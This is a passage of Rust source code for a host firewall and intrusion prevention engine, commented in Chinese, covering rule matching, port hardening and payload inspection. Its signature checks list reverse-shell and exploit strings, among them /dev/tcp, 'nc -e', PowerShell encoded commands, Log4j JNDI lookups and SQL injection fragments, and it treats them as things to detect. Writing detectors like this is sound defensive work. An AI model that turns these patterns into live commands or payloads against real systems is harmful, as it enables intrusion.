//! 跨平台主机防火墙 (Host Firewall) 与入侵防御引擎 (IPS - Intrusion Prevention System)
//!
//! 设计目标：
//! 1. **轻量高效**：O(N) 规则索引与多模式字节流签名检测，适配低配置 Intel Windows 与 Apple Silicon macOS，UI 零阻塞。
//! 2. **T5B8 + 深度特征融合 IPS**：结合 `crate::pretrained_models::inspect_network_payload_t5b8` 协议熵态编解码与
//!    反弹 Shell、NOP Sled/Shellcode、Redis RCE、Log4j JNDI/SQLi、高频端口扫描及 C2 心跳信道检测。
//! 3. **双向自动防御联动**：支持 `阻止防御 (PreventAutoBlock)` 与 `仅检测 (DetectOnly)` 切换；在阻止模式下自动下发动态
//!    `FirewallRule`、拦截 C2 端点并记录可审计取证事件，支持一键加白回滚与跨平台 OS 内核策略 (`PF` / `netsh`) 同步。

use crate::edr_engine::{LiveProcessRecord, NetworkSocketRecord};
use crate::platform::{self, FirewallRuleOsSpec, OsFirewallStatus};
use crate::pretrained_models::{inspect_network_payload_t5b8, T5B8ProtocolCodecResult};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

/// 防火墙方向
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum FirewallDirection {
    Inbound,
    Outbound,
    Both,
}

impl FirewallDirection {
    pub fn label(&self) -> &'static str {
        match self {
            FirewallDirection::Inbound => "入站 IN",
            FirewallDirection::Outbound => "出站 OUT",
            FirewallDirection::Both => "双向 BOTH",
        }
    }

    pub fn code(&self) -> &'static str {
        match self {
            FirewallDirection::Inbound => "IN",
            FirewallDirection::Outbound => "OUT",
            FirewallDirection::Both => "BOTH",
        }
    }

    pub fn matches(&self, target: FirewallDirection) -> bool {
        *self == FirewallDirection::Both || target == FirewallDirection::Both || *self == target
    }
}

/// 传输层协议
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum FirewallProtocol {
    Tcp,
    Udp,
    Any,
}

impl FirewallProtocol {
    pub fn label(&self) -> &'static str {
        match self {
            FirewallProtocol::Tcp => "TCP",
            FirewallProtocol::Udp => "UDP",
            FirewallProtocol::Any => "TCP/UDP",
        }
    }

    pub fn code(&self) -> &'static str {
        match self {
            FirewallProtocol::Tcp => "TCP",
            FirewallProtocol::Udp => "UDP",
            FirewallProtocol::Any => "ANY",
        }
    }
}

/// 防火墙规则动作
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum FirewallAction {
    Allow,
    Block,
}

impl FirewallAction {
    pub fn label(&self) -> &'static str {
        match self {
            FirewallAction::Allow => "放行 ALLOW",
            FirewallAction::Block => "阻断 BLOCK",
        }
    }

    pub fn code(&self) -> &'static str {
        match self {
            FirewallAction::Allow => "ALLOW",
            FirewallAction::Block => "BLOCK",
        }
    }
}

/// 单条跨平台主机防火墙规则
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallRule {
    pub rule_id: String,
    pub name: String,
    pub direction: FirewallDirection,
    pub protocol: FirewallProtocol,
    /// "*" | "any" | IP | CIDR | 前缀
    pub remote_ip: String,
    /// 0 表示全端口
    pub port: u16,
    /// "*" 或进程名关键字
    pub process_name: String,
    pub action: FirewallAction,
    pub enabled: bool,
    pub hit_count: u64,
    pub auto_generated_by_ips: bool,
    pub created_at: String,
    pub reason: String,
}

/// IPS 工作模式
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum IpsMode {
    DetectOnly,
    PreventAutoBlock,
}

impl IpsMode {
    pub fn label(&self) -> &'static str {
        match self {
            IpsMode::DetectOnly => "仅检测审计 (Detect-Only)",
            IpsMode::PreventAutoBlock => "主动阻断防御 (IPS Prevent)",
        }
    }

    pub fn is_prevent(&self) -> bool {
        *self == IpsMode::PreventAutoBlock
    }
}

/// IPS 威胁等级
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum IpsSeverity {
    Low,
    Medium,
    High,
    Critical,
}

impl IpsSeverity {
    pub fn label(&self) -> &'static str {
        match self {
            IpsSeverity::Low => "LOW",
            IpsSeverity::Medium => "MEDIUM",
            IpsSeverity::High => "HIGH",
            IpsSeverity::Critical => "CRITICAL",
        }
    }
}

/// IPS 入侵事件分类
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum IpsCategory {
    ReverseShell,
    ShellcodeMemoryInject,
    ExploitRce,
    PortScanSweep,
    WildcardServiceExposure,
    C2BeaconingChannel,
    ProtocolRegimeDrift,
}

impl IpsCategory {
    pub fn label(&self) -> &'static str {
        match self {
            IpsCategory::ReverseShell => "反弹 Shell / 命令执行",
            IpsCategory::ShellcodeMemoryInject => "Shellcode / NOP Sled 内存注入",
            IpsCategory::ExploitRce => "RCE / SQLi / JNDI 漏洞利用",
            IpsCategory::PortScanSweep => "高频端口扫描 / 侦察探测",
            IpsCategory::WildcardServiceExposure => "高危服务全网段监听暴露",
            IpsCategory::C2BeaconingChannel => "C2 隐蔽外联与控制信道",
            IpsCategory::ProtocolRegimeDrift => "T5B8 协议熵态畸变异常",
        }
    }
}

/// IPS 入侵拦截与审计事件
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IpsEvent {
    pub event_id: String,
    pub timestamp: String,
    pub pid: u32,
    pub process_name: String,
    pub src_or_local: String,
    pub dst_or_remote: String,
    pub remote_ip: String,
    pub port: u16,
    pub severity: IpsSeverity,
    pub category: IpsCategory,
    pub signature_id: String,
    pub signature_name: String,
    pub t5b8_hex: String,
    pub t5_regime: u8,
    pub t5b8_recon_error: f32,
    pub payload_preview: String,
    pub auto_blocked: bool,
    pub linked_rule_id: Option<String>,
    pub remediation_note: String,
}

/// 单次载荷 IPS + 防火墙联防裁决结果
#[derive(Debug, Clone)]
pub struct IpsInspectVerdict {
    pub is_malicious: bool,
    pub blocked_by_firewall: bool,
    pub triggered_rule_id: Option<String>,
    pub ips_event: Option<IpsEvent>,
    pub t5b8_result: T5B8ProtocolCodecResult,
    pub verdict_summary: String,
}

/// 持久化配置文件格式 (`vnb_firewall_ips.json`)
#[derive(Debug, Clone, Serialize, Deserialize)]
struct PersistedFirewallIpsState {
    mode: IpsMode,
    firewall_enabled: bool,
    rules: Vec<FirewallRule>,
    allowlisted_ips: Vec<String>,
}

/// 主机防火墙与 IPS 统一安全引擎
pub struct FirewallIpsEngine {
    pub mode: IpsMode,
    pub firewall_enabled: bool,
    pub rules: Vec<FirewallRule>,
    pub ips_events: Vec<IpsEvent>,
    pub allowlisted_ips: HashSet<String>,
    pub os_status: OsFirewallStatus,
    pub total_packets_inspected: u64,
    pub total_packets_blocked: u64,
    pub last_sync_message: String,
    next_rule_seq: u64,
    next_event_seq: u64,
    last_os_query_epoch: u64,
    seen_telemetry_keys: HashSet<String>,
    persistence_path: Option<PathBuf>,
}

fn now_hms() -> String {
    if let Ok(dur) = SystemTime::now().duration_since(UNIX_EPOCH) {
        let secs = dur.as_secs() + 8 * 3600;
        format!("{:02}:{:02}:{:02}", (secs / 3600) % 24, (secs / 60) % 60, secs % 60)
    } else {
        "12:00:00".to_string()
    }
}

fn now_epoch() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn normalize_ip(raw: &str) -> String {
    let trimmed = raw.trim();
    if trimmed.is_empty() || trimmed == "*" || trimmed.eq_ignore_ascii_case("any") {
        "*".to_string()
    } else {
        trimmed.trim_start_matches('[').trim_end_matches(']').to_string()
    }
}

fn is_loopback_or_trusted_ip(ip: &str, allowlist: &HashSet<String>) -> bool {
    let clean = normalize_ip(ip);
    clean == "127.0.0.1"
        || clean == "::1"
        || clean.eq_ignore_ascii_case("localhost")
        || clean == "0.0.0.0"
        || clean == "::"
        || allowlist.contains(&clean)
}

fn ip_rule_matches(rule_ip: &str, target_ip: &str) -> bool {
    let r = normalize_ip(rule_ip);
    if r == "*" {
        return true;
    }
    let t = normalize_ip(target_ip);
    if r == t {
        return true;
    }
    // 支持简单网段前缀如 "198.51.100." 或 CIDR 如 "198.51.100.0/24"
    if let Some((net, bits_str)) = r.split_once('/') {
        if let Ok(bits) = bits_str.parse::<u32>() {
            if let (Ok(r_v4), Ok(t_v4)) = (
                net.parse::<std::net::Ipv4Addr>(),
                t.parse::<std::net::Ipv4Addr>(),
            ) {
                let mask = if bits == 0 {
                    0u32
                } else {
                    !0u32 << (32 - bits.min(32))
                };
                return (u32::from(r_v4) & mask) == (u32::from(t_v4) & mask);
            }
        }
    }
    r.ends_with('.') && t.starts_with(&r)
}

fn safe_payload_preview(payload: &[u8]) -> String {
    let mut s = String::new();
    for &b in payload.iter().take(96) {
        if (0x20..=0x7E).contains(&b) {
            s.push(b as char);
        } else {
            s.push_str(&format!("\\x{:02x}", b));
        }
    }
    if payload.len() > 96 {
        s.push_str("...");
    }
    s
}

fn high_risk_port_catalog() -> &'static [(u16, &'static str, &'static str)] {
    &[
        (4444, "FW-PRE-C2-4444", "Metasploit / 反弹 Shell 默认控制端口 4444"),
        (31337, "FW-PRE-C2-31337", "经典后门与木马监听端口 31337"),
        (1337, "FW-PRE-C2-1337", "高危隐蔽渗透与 C2 回连端口 1337"),
        (23, "FW-PRE-TELNET-23", "明文弱口令 Telnet 23 入站阻断"),
        (445, "FW-PRE-SMB-445", "SMB 文件共享横向渗透暴露端口 445"),
        (3389, "FW-PRE-RDP-3389", "RDP 远程桌面暴破暴露端口 3389"),
        (6379, "FW-PRE-REDIS-6379", "Redis 未授权访问高危入站端口 6379"),
        (11211, "FW-PRE-MEMCACHED-11211", "Memcached 反射放大与未授权端口 11211"),
    ]
}

fn build_default_rules() -> Vec<FirewallRule> {
    let ts = now_hms();
    vec![
        FirewallRule {
            rule_id: "FW-ALLOW-LOCAL-9006".to_string(),
            name: "本地 9006 模型/System1 网关放行".to_string(),
            direction: FirewallDirection::Both,
            protocol: FirewallProtocol::Tcp,
            remote_ip: "127.0.0.1".to_string(),
            port: 9006,
            process_name: "*".to_string(),
            action: FirewallAction::Allow,
            enabled: true,
            hit_count: 0,
            auto_generated_by_ips: false,
            created_at: ts.clone(),
            reason: "保障本地 9006 三元记忆网关与协同服务不被误拦".to_string(),
        },
        FirewallRule {
            rule_id: "FW-PRE-C2-4444".to_string(),
            name: "阻断常见反弹 Shell 端口 4444".to_string(),
            direction: FirewallDirection::Outbound,
            protocol: FirewallProtocol::Tcp,
            remote_ip: "*".to_string(),
            port: 4444,
            process_name: "*".to_string(),
            action: FirewallAction::Block,
            enabled: true,
            hit_count: 0,
            auto_generated_by_ips: false,
            created_at: ts.clone(),
            reason: "默认拦截高危反弹 Shell 4444 端口外联".to_string(),
        },
        FirewallRule {
            rule_id: "FW-PRE-C2-31337".to_string(),
            name: "阻断高危后门端口 31337".to_string(),
            direction: FirewallDirection::Both,
            protocol: FirewallProtocol::Tcp,
            remote_ip: "*".to_string(),
            port: 31337,
            process_name: "*".to_string(),
            action: FirewallAction::Block,
            enabled: true,
            hit_count: 0,
            auto_generated_by_ips: false,
            created_at: ts.clone(),
            reason: "默认阻断高危木马后门控制端口 31337".to_string(),
        },
        FirewallRule {
            rule_id: "FW-PRE-TELNET-23".to_string(),
            name: "阻断明文 Telnet 23 入站".to_string(),
            direction: FirewallDirection::Inbound,
            protocol: FirewallProtocol::Tcp,
            remote_ip: "*".to_string(),
            port: 23,
            process_name: "*".to_string(),
            action: FirewallAction::Block,
            enabled: true,
            hit_count: 0,
            auto_generated_by_ips: false,
            created_at: ts,
            reason: "禁用不安全明文 Telnet 23 入站连接".to_string(),
        },
    ]
}

impl Default for FirewallIpsEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl FirewallIpsEngine {
    /// 生产环境构造：加载本地持久化规则，并查询一次 OS 原生防火墙状态
    pub fn new() -> Self {
        let mut engine = Self::new_ui_shell();
        engine.refresh_os_status(true);
        engine
    }

    /// 极速轻量冷启动构造：仅加载本地规则配置，不阻塞查询 OS 防火墙子进程（由后台巡检线程刷新）
    pub fn new_ui_shell() -> Self {
        let persistence_path = Some(platform::app_file("vnb_firewall_ips.json"));
        let mut engine = Self::new_internal(persistence_path.clone(), false);
        if let Some(ref p) = persistence_path {
            engine.load_from_file(p);
        }
        engine
    }

    /// 零磁盘副作用测试沙盒构造：不触碰用户配置目录，不执行 OS 子进程探查
    pub fn new_sandbox() -> Self {
        Self::new_internal(None, true)
    }

    /// 禁用磁盘规则持久化（供自动化测试调用，防止将合成规则写入真实配置）
    pub fn disable_persistence(&mut self) {
        self.persistence_path = None;
    }

    fn new_internal(persistence_path: Option<PathBuf>, is_sandbox: bool) -> Self {
        let mut allowlisted_ips = HashSet::new();
        allowlisted_ips.insert("127.0.0.1".to_string());
        allowlisted_ips.insert("::1".to_string());
        allowlisted_ips.insert("localhost".to_string());

        let os_status = OsFirewallStatus {
            backend_name: if is_sandbox {
                "Sandbox Mock Firewall Backend".to_string()
            } else {
                "Host Firewall Initializing".to_string()
            },
            os_firewall_enabled: true,
            stealth_or_profile: "Ready".to_string(),
            synced_anchor_rules: 0,
            anchor_path: String::new(),
            detail: "等待刷新系统防火墙状态".to_string(),
        };

        Self {
            mode: IpsMode::PreventAutoBlock,
            firewall_enabled: true,
            rules: build_default_rules(),
            ips_events: Vec::new(),
            allowlisted_ips,
            os_status,
            total_packets_inspected: 0,
            total_packets_blocked: 0,
            last_sync_message: "防火墙与 IPS 引擎已就绪".to_string(),
            next_rule_seq: 1,
            next_event_seq: 1,
            last_os_query_epoch: 0,
            seen_telemetry_keys: HashSet::new(),
            persistence_path,
        }
    }

    fn load_from_file(&mut self, path: &Path) {
        let Ok(txt) = fs::read_to_string(path) else {
            return;
        };
        let Ok(saved) = serde_json::from_str::<PersistedFirewallIpsState>(&txt) else {
            return;
        };
        self.mode = saved.mode;
        self.firewall_enabled = saved.firewall_enabled;
        if !saved.rules.is_empty() {
            self.rules = saved.rules;
            self.next_rule_seq = (self.rules.len() as u64) + 10;
        }
        for ip in saved.allowlisted_ips {
            self.allowlisted_ips.insert(normalize_ip(&ip));
        }
    }

    pub fn save_persisted(&self) {
        let Some(ref path) = self.persistence_path else {
            return;
        };
        let payload = PersistedFirewallIpsState {
            mode: self.mode,
            firewall_enabled: self.firewall_enabled,
            rules: self.rules.clone(),
            allowlisted_ips: self.allowlisted_ips.iter().cloned().collect(),
        };
        if let Ok(json) = serde_json::to_string_pretty(&payload) {
            if let Some(parent) = path.parent() {
                let _ = fs::create_dir_all(parent);
            }
            let _ = fs::write(path, json);
        }
    }

    /// 刷新操作系统防火墙状态（内置 15s 节流保护，防止低配置机器频繁拉起 netsh/socketfilterfw）
    pub fn refresh_os_status(&mut self, force: bool) {
        let now = now_epoch();
        if !force && now.saturating_sub(self.last_os_query_epoch) < 15 {
            return;
        }
        self.last_os_query_epoch = now;
        self.os_status = platform::query_os_firewall_status();
    }

    pub fn set_ips_mode(&mut self, mode: IpsMode) {
        self.mode = mode;
        self.last_sync_message = format!("[IPS-MODE] 已切换入侵防御工作模式 -> {}", mode.label());
        self.save_persisted();
    }

    pub fn toggle_ips_mode(&mut self) -> IpsMode {
        let next = match self.mode {
            IpsMode::PreventAutoBlock => IpsMode::DetectOnly,
            IpsMode::DetectOnly => IpsMode::PreventAutoBlock,
        };
        self.set_ips_mode(next);
        next
    }

    /// 新增或去重更新防火墙规则，返回 rule_id
    #[allow(clippy::too_many_arguments)]
    pub fn add_rule(
        &mut self,
        name: &str,
        direction: FirewallDirection,
        protocol: FirewallProtocol,
        remote_ip: &str,
        port: u16,
        process_name: &str,
        action: FirewallAction,
        reason: &str,
        auto_ips: bool,
    ) -> String {
        let norm_ip = normalize_ip(remote_ip);
        let norm_proc = if process_name.trim().is_empty() {
            "*".to_string()
        } else {
            process_name.trim().to_string()
        };

        if let Some(existing) = self.rules.iter_mut().find(|r| {
            r.direction == direction
                && r.protocol == protocol
                && normalize_ip(&r.remote_ip) == norm_ip
                && r.port == port
                && r.process_name == norm_proc
                && r.action == action
        }) {
            existing.enabled = true;
            existing.reason = reason.to_string();
            let id = existing.rule_id.clone();
            self.save_persisted();
            return id;
        }

        let rule_id = format!(
            "{}-{:04}",
            if auto_ips { "FW-IPS" } else { "FW-USR" },
            self.next_rule_seq
        );
        self.next_rule_seq += 1;
        let rule = FirewallRule {
            rule_id: rule_id.clone(),
            name: name.to_string(),
            direction,
            protocol,
            remote_ip: norm_ip,
            port,
            process_name: norm_proc,
            action,
            enabled: true,
            hit_count: 0,
            auto_generated_by_ips: auto_ips,
            created_at: now_hms(),
            reason: reason.to_string(),
        };
        // 动态 IPS 阻断规则置于前排（但在 Allow 白名单规则匹配逻辑之后生效）
        self.rules.insert(0, rule);
        if self.rules.len() > 256 {
            self.rules.truncate(256);
        }
        self.save_persisted();
        rule_id
    }

    pub fn toggle_rule(&mut self, rule_id: &str) -> Option<(bool, String)> {
        let mut result = None;
        for r in &mut self.rules {
            if r.rule_id == rule_id {
                r.enabled = !r.enabled;
                result = Some((
                    r.enabled,
                    format!(
                        "[FW-RULE] {} ({}) -> {}",
                        r.rule_id,
                        r.name,
                        if r.enabled { "已启用" } else { "已暂停" }
                    ),
                ));
                break;
            }
        }
        if let Some((_, ref msg)) = result {
            self.last_sync_message = msg.clone();
            self.save_persisted();
        }
        result
    }

    pub fn remove_rule(&mut self, rule_id: &str) -> bool {
        let before = self.rules.len();
        self.rules.retain(|r| r.rule_id != rule_id);
        let removed = self.rules.len() < before;
        if removed {
            self.last_sync_message = format!("[FW-RULE] 已删除防火墙规则 {}", rule_id);
            self.save_persisted();
        }
        removed
    }

    /// 将指定 IP 加入防误杀白名单，并禁用针对该 IP 的 IPS 自动阻断规则
    pub fn allowlist_ip_and_unblock(&mut self, ip: &str) -> String {
        let norm = normalize_ip(ip);
        if norm == "*" {
            return "[FW-ALLOW] 无效通配符 IP，未加入白名单".to_string();
        }
        self.allowlisted_ips.insert(norm.clone());
        let mut disabled_cnt = 0usize;
        for r in &mut self.rules {
            if r.action == FirewallAction::Block && normalize_ip(&r.remote_ip) == norm && r.enabled {
                r.enabled = false;
                disabled_cnt += 1;
            }
        }
        let msg = format!(
            "[FW-ALLOW] 已将 {} 加入信任白名单并解除 {} 条关联阻断规则",
            norm, disabled_cnt
        );
        self.last_sync_message = msg.clone();
        self.save_persisted();
        msg
    }

    /// 一键加固全量高危暴露服务与木马常用端口（6379 Redis / 445 SMB / 3389 RDP / 23 Telnet / 4444 / 1337 / 31337 / 11211）
    pub fn harden_high_risk_ports(&mut self) -> usize {
        let mut added_or_enabled = 0usize;
        for &(port, fixed_id, desc) in high_risk_port_catalog() {
            if let Some(existing) = self
                .rules
                .iter_mut()
                .find(|r| r.rule_id == fixed_id || (r.port == port && r.action == FirewallAction::Block && normalize_ip(&r.remote_ip) == "*"))
            {
                if !existing.enabled {
                    existing.enabled = true;
                    added_or_enabled += 1;
                }
            } else {
                self.rules.push(FirewallRule {
                    rule_id: fixed_id.to_string(),
                    name: format!("高危端口屏蔽 TCP/{}", port),
                    direction: if port == 4444 || port == 1337 || port == 31337 {
                        FirewallDirection::Both
                    } else {
                        FirewallDirection::Inbound
                    },
                    protocol: FirewallProtocol::Tcp,
                    remote_ip: "*".to_string(),
                    port,
                    process_name: "*".to_string(),
                    action: FirewallAction::Block,
                    enabled: true,
                    hit_count: 0,
                    auto_generated_by_ips: false,
                    created_at: now_hms(),
                    reason: desc.to_string(),
                });
                added_or_enabled += 1;
            }
        }
        self.last_sync_message = format!(
            "[FW-HARDEN] 高危端口基线加固完成（新启用/添加 {} 条策略，共 {} 条活跃规则）",
            added_or_enabled,
            self.active_rules_count()
        );
        self.save_persisted();
        added_or_enabled
    }

    pub fn active_rules_count(&self) -> usize {
        self.rules.iter().filter(|r| r.enabled).count()
    }

    pub fn auto_ips_rules_count(&self) -> usize {
        self.rules
            .iter()
            .filter(|r| r.enabled && r.auto_generated_by_ips)
            .count()
    }

    /// 根据防火墙规则表评估单次网络连接，优先匹配明确 Allow 规则，再匹配 Block 规则
    pub fn evaluate_firewall_connection(
        &mut self,
        direction: FirewallDirection,
        protocol: FirewallProtocol,
        remote_ip: &str,
        port: u16,
        proc_name: &str,
    ) -> Option<(String, FirewallAction)> {
        if !self.firewall_enabled {
            return None;
        }
        let proc_lower = proc_name.to_ascii_lowercase();
        let norm_ip = normalize_ip(remote_ip);

        // 1. 先检查显式 Allow 规则（例如 127.0.0.1:9006）
        for r in &mut self.rules {
            if !r.enabled || r.action != FirewallAction::Allow {
                continue;
            }
            if !r.direction.matches(direction) {
                continue;
            }
            if r.protocol != FirewallProtocol::Any && protocol != FirewallProtocol::Any && r.protocol != protocol {
                continue;
            }
            if r.port != 0 && r.port != port {
                continue;
            }
            if r.process_name != "*" && !proc_lower.contains(&r.process_name.to_ascii_lowercase()) {
                continue;
            }
            if ip_rule_matches(&r.remote_ip, &norm_ip) {
                r.hit_count += 1;
                return Some((r.rule_id.clone(), FirewallAction::Allow));
            }
        }

        // 若目标处于全局白名单 IP，放行
        if self.allowlisted_ips.contains(&norm_ip) {
            return None;
        }

        // 2. 再检查 Block 规则
        for r in &mut self.rules {
            if !r.enabled || r.action != FirewallAction::Block {
                continue;
            }
            if !r.direction.matches(direction) {
                continue;
            }
            if r.protocol != FirewallProtocol::Any && protocol != FirewallProtocol::Any && r.protocol != protocol {
                continue;
            }
            if r.port != 0 && r.port != port {
                continue;
            }
            if r.process_name != "*" && !proc_lower.contains(&r.process_name.to_ascii_lowercase()) {
                continue;
            }
            if ip_rule_matches(&r.remote_ip, &norm_ip) {
                r.hit_count += 1;
                self.total_packets_blocked += 1;
                return Some((r.rule_id.clone(), FirewallAction::Block));
            }
        }

        None
    }

    fn record_ips_event(
        &mut self,
        pid: u32,
        process_name: &str,
        src_or_local: &str,
        dst_or_remote: &str,
        remote_ip: &str,
        port: u16,
        severity: IpsSeverity,
        category: IpsCategory,
        signature_id: &str,
        signature_name: &str,
        t5b8_hex: &str,
        t5_regime: u8,
        t5b8_recon_error: f32,
        payload_preview: &str,
        should_auto_block: bool,
    ) -> IpsEvent {
        let norm_ip = normalize_ip(remote_ip);
        let can_block_target = should_auto_block
            && self.mode == IpsMode::PreventAutoBlock
            && !is_loopback_or_trusted_ip(&norm_ip, &self.allowlisted_ips);

        let linked_rule_id = if can_block_target {
            let block_ip = if norm_ip == "*" { "*".to_string() } else { norm_ip.clone() };
            let block_port = if block_ip == "*" { port } else { 0 };
            if block_ip != "*" || block_port > 0 {
                Some(self.add_rule(
                    &format!("IPS自动拦截 {} ({})", block_ip, signature_id),
                    FirewallDirection::Both,
                    FirewallProtocol::Tcp,
                    &block_ip,
                    block_port,
                    "*",
                    FirewallAction::Block,
                    &format!("IPS 联动自动阻断: {}", signature_name),
                    true,
                ))
            } else {
                None
            }
        } else {
            None
        };

        let auto_blocked = linked_rule_id.is_some();
        if auto_blocked {
            self.total_packets_blocked += 1;
        }

        let event_id = format!("IPS-{:05}", self.next_event_seq);
        self.next_event_seq += 1;

        let remediation_note = if let Some(ref rid) = linked_rule_id {
            format!(
                "已触发 {} 自动防御：生成防火墙阻断规则 {}（目标 {}:{})",
                self.mode.label(),
                rid,
                norm_ip,
                port
            )
        } else if self.mode == IpsMode::DetectOnly {
            "当前处于“仅检测审计”模式：已告警记录，未下发阻断规则".to_string()
        } else {
            "目标位于本地回环或显式白名单，已降级为审计告警防误杀".to_string()
        };

        let ev = IpsEvent {
            event_id,
            timestamp: now_hms(),
            pid,
            process_name: process_name.to_string(),
            src_or_local: src_or_local.to_string(),
            dst_or_remote: dst_or_remote.to_string(),
            remote_ip: norm_ip,
            port,
            severity,
            category,
            signature_id: signature_id.to_string(),
            signature_name: signature_name.to_string(),
            t5b8_hex: t5b8_hex.to_string(),
            t5_regime,
            t5b8_recon_error,
            payload_preview: payload_preview.to_string(),
            auto_blocked,
            linked_rule_id,
            remediation_note,
        };

        self.ips_events.insert(0, ev.clone());
        if self.ips_events.len() > 160 {
            self.ips_events.truncate(160);
        }
        ev
    }

    /// 深度流量包 IPS + T5B8 + 主机防火墙联合检测（返回完整拦截裁决）
    #[allow(clippy::too_many_arguments)]
    pub fn inspect_payload_ips(
        &mut self,
        payload: &[u8],
        proc_name: &str,
        pid: u32,
        local_port: u16,
        remote_ip: &str,
        remote_port: u16,
        is_wildcard: bool,
    ) -> IpsInspectVerdict {
        self.total_packets_inspected += 1;
        let effective_port = if remote_port > 0 { remote_port } else { local_port };
        let norm_ip = normalize_ip(remote_ip);

        // 1. 先检查已有防火墙规则
        let fw_hit = self.evaluate_firewall_connection(
            if is_wildcard { FirewallDirection::Inbound } else { FirewallDirection::Outbound },
            FirewallProtocol::Tcp,
            &norm_ip,
            effective_port,
            proc_name,
        );

        // 2. 运行 T5B8 协议熵态编解码检测
        let t5b8 = inspect_network_payload_t5b8(payload, proc_name, local_port, remote_port, is_wildcard);

        // 3. 多维度深度 IPS 特征签名扫描
        let text_lower = String::from_utf8_lossy(payload).to_ascii_lowercase();
        let mut nop_run = 0usize;
        let mut max_nop_run = 0usize;
        for &b in payload {
            if b == 0x90 {
                nop_run += 1;
                max_nop_run = max_nop_run.max(nop_run);
            } else {
                nop_run = 0;
            }
        }
        let has_syscall_stub = payload.windows(2).any(|w| w == [0x0f, 0x05] || w == [0xcd, 0x80]);

        let matched_sig: Option<(IpsCategory, IpsSeverity, &str, &str)> = if text_lower.contains("/dev/tcp/")
            || text_lower.contains("bash -i")
            || text_lower.contains("nc -e")
            || text_lower.contains("ncat -e")
            || text_lower.contains("pty.spawn(")
            || text_lower.contains("powershell -enc")
            || text_lower.contains("new-object net.webclient")
        {
            Some((
                IpsCategory::ReverseShell,
                IpsSeverity::Critical,
                "IPS-SIG-1001",
                "交互式反弹 Shell 隧道特征 (/dev/tcp / nc -e / PowerShell)",
            ))
        } else if (max_nop_run >= 5 && (has_syscall_stub || payload.contains(&0xCC)))
            || (t5b8.is_attack && t5b8.attack_class.to_ascii_lowercase().contains("shellcode"))
        {
            Some((
                IpsCategory::ShellcodeMemoryInject,
                IpsSeverity::Critical,
                "IPS-SIG-1002",
                "NOP Sled + x86_64 Syscall 机器码内存注入载荷",
            ))
        } else if (text_lower.contains("config") && text_lower.contains("set") && (text_lower.contains("dir") || text_lower.contains("cron") || text_lower.contains("flushall")))
            || text_lower.contains("${jndi:ldap://")
            || text_lower.contains("${jndi:rmi://")
            || text_lower.contains("union select ")
            || text_lower.contains("; drop table ")
        {
            Some((
                IpsCategory::ExploitRce,
                IpsSeverity::Critical,
                "IPS-SIG-1003",
                "高危漏洞利用载荷 (Redis未授权RCE / Log4j JNDI / SQL注入)",
            ))
        } else if t5b8.is_attack
            && !is_loopback_or_trusted_ip(&norm_ip, &self.allowlisted_ips)
        {
            let cat = if t5b8.attack_class.contains("Exfil") || t5b8.attack_class.contains("外传") || effective_port == 4444 || effective_port == 1337 {
                IpsCategory::C2BeaconingChannel
            } else {
                IpsCategory::ProtocolRegimeDrift
            };
            Some((
                cat,
                if t5b8.recon_error >= 0.42 { IpsSeverity::High } else { IpsSeverity::Medium },
                "IPS-T5B8-1004",
                &t5b8.attack_class,
            ))
        } else {
            None
        };

        let preview = safe_payload_preview(payload);
        let src = format!("PID:{}({}) :{}", pid, proc_name, local_port);
        let dst = format!("{}:{}", norm_ip, remote_port);

        if let Some((cat, sev, sig_id, sig_name)) = matched_sig {
            let sig_name_owned = sig_name.to_string();
            let ev = self.record_ips_event(
                pid,
                proc_name,
                &src,
                &dst,
                &norm_ip,
                effective_port,
                sev,
                cat,
                sig_id,
                &sig_name_owned,
                &t5b8.t5b8_hex,
                t5b8.t5_regime,
                t5b8.recon_error,
                &preview,
                true,
            );
            let blocked_by_fw = ev.auto_blocked
                || matches!(fw_hit, Some((_, FirewallAction::Block)));
            let trig_rule = ev
                .linked_rule_id
                .clone()
                .or_else(|| fw_hit.map(|(rid, _)| rid));
            let verdict_summary = format!(
                "[IPS-{}] {} · {} -> {} ({})",
                if blocked_by_fw { "BLOCKED" } else { "DETECTED" },
                sig_id,
                sig_name_owned,
                dst,
                t5b8.t5b8_hex
            );
            return IpsInspectVerdict {
                is_malicious: true,
                blocked_by_firewall: blocked_by_fw,
                triggered_rule_id: trig_rule,
                ips_event: Some(ev),
                t5b8_result: t5b8,
                verdict_summary,
            };
        }

        match fw_hit {
            Some((rid, FirewallAction::Block)) => IpsInspectVerdict {
                is_malicious: false,
                blocked_by_firewall: true,
                triggered_rule_id: Some(rid.clone()),
                ips_event: None,
                t5b8_result: t5b8,
                verdict_summary: format!("[FW-DENY] 命中防火墙规则 {} 已丢弃 {}", rid, dst),
            },
            Some((rid, FirewallAction::Allow)) => IpsInspectVerdict {
                is_malicious: false,
                blocked_by_firewall: false,
                triggered_rule_id: Some(rid.clone()),
                ips_event: None,
                t5b8_result: t5b8,
                verdict_summary: format!("[ALLOW] 命中信任放行规则 {} ({})", rid, dst),
            },
            None => {
                let verdict_summary = format!(
                    "[CLEAN] 载荷正常放行 ({} · 状态字={})",
                    dst,
                    t5b8_hex_fallback(&t5b8)
                );
                IpsInspectVerdict {
                    is_malicious: false,
                    blocked_by_firewall: false,
                    triggered_rule_id: None,
                    ips_event: None,
                    t5b8_result: t5b8,
                    verdict_summary,
                }
            }
        }
    }

    /// 基于实时宿主 Socket 与进程遥测执行轻量行为级 IPS 评估（支持端口扫描与 C2/暴露端口自动阻断）
    pub fn evaluate_sockets_and_processes(
        &mut self,
        sockets: &[NetworkSocketRecord],
        procs: &[LiveProcessRecord],
    ) -> Vec<IpsEvent> {
        let self_pid = std::process::id();
        let mut new_events = Vec::new();
